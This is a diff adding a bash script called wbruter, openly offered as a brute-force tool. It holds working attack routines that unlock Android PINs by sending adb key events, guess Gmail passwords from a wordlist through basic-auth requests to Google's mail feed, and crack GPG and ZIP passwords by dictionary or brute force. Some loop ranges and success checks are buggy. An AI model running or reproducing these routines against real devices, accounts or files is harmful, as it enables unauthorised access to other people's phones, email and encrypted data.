@@ -1,0 +1,358 @@
+#!/bin/bash
+####
+#### Author: wuseman <wuseman@nr1.nu>
+#### License: GPL 3.0
+#### Description: Bruteforce tool for various stuff
+#### Usage: ./wbruter -[option]
+####
+
+help() {
+echo ""
+echo " $(basename "$0")-$VER is a bruteforce tool for devices and file extension written in pure bash code"
+echo ""
+echo "       where: "
+echo "            -a [4] [6] ANDROID          - Brute force attack androdi device with 4 or 6 digits"
+echo "            -h         HELP             - Print this help"
+echo "            -G         GPG              - Dictionary attack for encrypted gpg files"
+echo "            -g         GMAIL            - Brute force attack an gmail account"
+echo "            -z         ZIP              - Dictionary and Brute Force attack an zip file"
+echo ""
+}
+
+if [[ -z $1 ]]; then help;exit 0;fi
+
+requirements_gmail() {
+if [[ -n $(curl -v &> /dev/null) ]]; then
+    echo "Curl is required for this tool, aborted."
+    exit 1
+fi
+}
+
+adbexist() {
+adb="$(which adb 2> /dev/null)"
+distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"
+
+if [ -z "$adb" ]; then
+ echo -e "\nThis tool require adb...\n"
+  read -p "Install adb (Y/n) " adbinstall
+fi
+
+case $adbinstall in
+     "Y")
+        echo -e "\nPlease wait..\n"
+      sleep 1
+case $distro in
+     "Gentoo")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        emerge --ask android-tools ;;
+     "Sabayon")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        emerge --ask android-tools ;;
+     "Ubuntu")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Debian")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Raspbian")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "Mint")
+        echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
+        apt update -y; apt upgrade -y; apt-get install adb ;;
+     "no") echo "Aborted." ;
+           exit 0 ;;
+esac
+       echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
+esac
+}
+
+android_gui_pin_attack() {
+isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
+ if [ ! $isphoneconnected 2> /dev/null ]; then
+      echo "Your device is not connected properly.."
+      exit
+fi
+screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+case $screen in
+ "mScreenState=OFF") echo -e "Preparing device.\n" ;;
+ "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+ adb shell input keyevent 26
+   echo -e "All Has Been Set\n"
+ adb shell input keyevent 82
+ adb shell input swipe 407 1211 378 85
+for i in {000..9999}; do
+   echo -e "Trying pin: $i"
+for (( j=0; j<${#i}; j++ )); do
+   adb shell input keyevent $((`echo ${i:$j:1}`+7))
+done
+   adb shell input keyevent 66
+   adb shell input swipe 407 1211 378 85
+clear() {
+   adb shell input keyevent KEYCODE_MOVE_END
+   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+if ! (( `expr $i + 1` % 4 )); then
+   adb shell input keyevent 66
+   sleep 30
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+fi
+done
+}
+
+android_gui_6pin_attack() {
+isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
+ if [ ! $isphoneconnected 2> /dev/null ]; then
+      echo "Your device is not connected properly.."
+      exit; fi
+isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
+ if [ $isphoneconnected 2> /dev/null ]; then
+      echo "Your device is not connected properly.."
+      exit; fi
+screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+case $screen in
+ "mScreenState=OFF") echo -e "\e[0;1m[-] Preparing to attack.\e[0m"; 
+                     echo -e "\e[0;1m[-] All Has Been Set\e[0m" ;;
+ "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+esac
+   echo -e "\e[0;1m[-] Preparing to attack.\e[0m"
+   adb shell input keyevent 26
+   echo -e "\e[0;1m[-] All Has Been Set\e[0m"
+   echo -e "\e[0;1m[-] Attack Will Now Begin\e[0m"
+   echo -e "\e[0;1m[-] -------------------\e[0m"
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+for i in {00000..99999}; do
+   echo -e "\e[0;1mTrying pin:  $i\e[0m"
+for (( j=0; j<${#i}; j++ )); do
+   adb shell input keyevent $((`echo ${i:$j:1}`+7))
+done
+   adb shell input keyevent 66
+   adb shell input swipe 407 1211 378 85
+clear() {
+   adb shell input keyevent KEYCODE_MOVE_END
+   adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+if ! (( `expr $i + 1` % 4 )); then
+   adb shell input keyevent 66
+   sleep 30
+   adb shell input keyevent 82
+   adb shell input swipe 407 1211 378 85
+fi
+done
+}
+
+gmail_attack() {
+    echo -e "Enter email-address & wordlist"
+read -p $'Email: ' mail
+if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
+   echo -e "Error: email address $email is invalid, aborted."
+   exit 0
+fi
+read -p $'Wordlist: ' wordlist
+if [[ ! -a $wordlist ]]; then
+   echo "Error: There is no such wordlist, aborted"
+   exit 0
+fi
+
+   echo -e ""
+   echo -e "IP: $(curl -s https://nr1.nu/ip/ | sed -n '27p')"
+   echo -e "Target: $mail"
+   echo -e "Wordlist: $(pwd)/$wordlist"
+   echo -e ""
+   read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
+if [ $ready = "yes" ]; then                                                                                                                                               # Check IP and ask user if he is ready
+   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+while read -r line; do
+name="$line"
+attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"                                                                                    # If password is correct, then we can grab xml
+if [ -z "$attack" ]; then
+   echo ""
+   echo -e "Wrong Password for $mail: \e[1;31m$name\e[0m"                                                                                              # If there is no xml output, then pw is wrong
+   sleep 1                                                                                                                                                                # and we will let the user know this by echo to stdout
+fi
+
+if [ -n "$attack" ]; then
+   echo -e ""
+   echo -e "---------------------------------------------------------------------------------------"
+   echo -e  ""
+   echo -e  "Password Has Been Found: $name"
+   echo -e             ""
+   echo -e "---------------------------------------------------------------------------------------"
+   exit
+fi
+done < "$wordlist"
+echo -e ""
+echo -e  "Sorry, no passwords in $wordlist matched $mail current password. "
+echo -e   "Try your luck with another mwordlist instead..."
+exit
+else
+   echo -e "Aborted."
+   echo -e " ---------------------------------------------------------------------------------------"
+fi
+}
+
+gpgd() {
+read -p "GPG File: " GPG_FILE
+read -p "Wordlist: " WORDLIST
+echo -e ""
+echo -e "Target File: $GPG_FILE"
+echo -e "Wordlist: $WORDLIST"
+echo -e ""
+read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
+if [ $ready = "yes" ]; then                                                                                                                                               # Check IP and ask user if he is ready
+   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
+for word in $(cat $WORDLIST); do 
+echo $word | gpg --passphrase-fd 0 -q --batch --allow-multiple-messages --no-tty  --output $GPG_FILE -d $GPG_FILE 2> /dev/null
+echo -e "Wrong password: \e[1;31m$word\e[0m"
+done;
+if [ $? = "0" ]; then
+    echo "--------------------------------------"
+    echo -e "GPG passphrase: \e[1;32m${word}\e[0m";
+    echo "--------------------------------------"
+    exit 0;
+fi
+
+fi
+}
+
+if [[ $1 = "-z" ]]; then
+
+help() {
+cat << "EOF"
+./wbruter -z [option] [length_of_password] [option] [place_to_store_cracked_data]
+Bruteforce Usage:
+      ./wbruter -z -b [lenght_password] [mode] /path/to/store/cracked_path
+            where mode is:
+                      A - Use uppercase characters from: A-Z
+                      a - Use lowercase characters from: a-z
+                      0 - Use nummeric passwords from: 0-9
+                      ? - Use special characters from #.?
+Dictionary Usage:
+      ./wbruter -z -d [wordlist] [zipfile]
+             where:
+                      wordlist - Location for wordlist"
+                      zipfile  - Location to zipfile"
+EOF
+}
+
+declare -r TRUE=0
+declare -r FALSE=1
+
+flag=$FALSE
+counter=0
+
+lowercase=`echo {a..z}`
+uppercase=`echo {A..Z}`
+numberic=`echo {0..9}`
+specialchars="~ ! @ \$ % ^ - _ = + { } [ ] : , . / ?"
+
+crack() {
+	pass=$1
+	printf "Wrong Password: \e[1;31m$pass\e[0m\n"
+	counter=$(($counter + 1))
+	unzip -P $pass -o $file_name &> /dev/null
+	[ $? -eq 0 ] && echo "============================================" && printf "\e[1;32m\e[0m Password Was Successfully Cracked: \e[1;32m$pass\e[0m\n" && echo "Password Tried: $counter"&& return $TRUE || return 
+$FALSE 
+
+        exit
+}
+
+wordgen() {
+args=$1
+[ ${#args} -ge $length ] && crack $1 && sleep 1 && flag=$TRUE && exit
+
+if [[ ${#args} -lt $length ]]; then
+for c in $chars; do
+   wordgen $1$c
+done
+fi
+}
+
+is_num() {
+	[ "$1" -eq "$1" ] > /dev/null 2>&1
+	return $?
+}
+
+
+brute4force() {
+if [ "$1" = "" ]
+then
+        printf "Error: Please use a valid option\nExample usage: ./wbruter -b uppercase filename.zip\nAborted cause failure.\n"
+  exit
+fi
+
+
+if is_num $1; then
+  length=$1; else length=2
+fi
+
+for args in "$@"; do
+case $args in
+    lowercase) chars="$chars $lowercase" ;;
+    uppercase) chars="$chars $uppercase" ;;
+    numberic) chars="$chars $numberic" ;;
+    specialchars) chars="$chars $specialchars" ;;
+  esac
+done
+
+
+if [ "$chars" = "" ]; then
+  chars="$lowercase"
+fi
+
+for arg in "$@"; do
+  if [ -a $arg ]; then
+    file_name=$arg
+    break
+  fi
+done
+
+
+if [ "$file_name" = "" ]; then
+        printf "You forgot to specify wich zipfile you want to attack:\n"  
+        printf "Example usage: ./wbruter -b uppercase filename.zip\nAborted cause failure.\n"  
+        exit 0
+fi
+
+for w in $chars; do
+   wordgen $w;
+done
+}
+
+if [ "$2" = "-b" ]
+then
+        brute4force $3 $4 $5
+else
+        printf "Error: Please use a valid option\nExample usage: ./wbruter -b uppercase filename.zip\nAborted cause failure.\n"
+        exit
+fi
+
+if [ $flag -eq $FALSE ]
+then
+	echo "Could not Found Password ?? "
+	echo "Password tried : $counter"
+	echo "please Try Again with other Keywords."
+fi
+
+fi
+
+
+
+while getopts ":abghG" getopt; do
+ case $getopt in
+   a)
+    if [[ -z $2 ]]; then
+      echo "Error: You must specify atleast one argument of 4 or 6 digits (./wbruter -a 4)"
+    fi
+case $2 in
+  "4") adbexist; android_gui_pin_attack ;;
+  "6") adbexist; android_gui_6pin_attack ;;
+esac ;;
+   h) help ;;
+   G) gpgd ;;
+   g) requirements_gmail; gmail_attack ;;
+   esac
+done
+
+
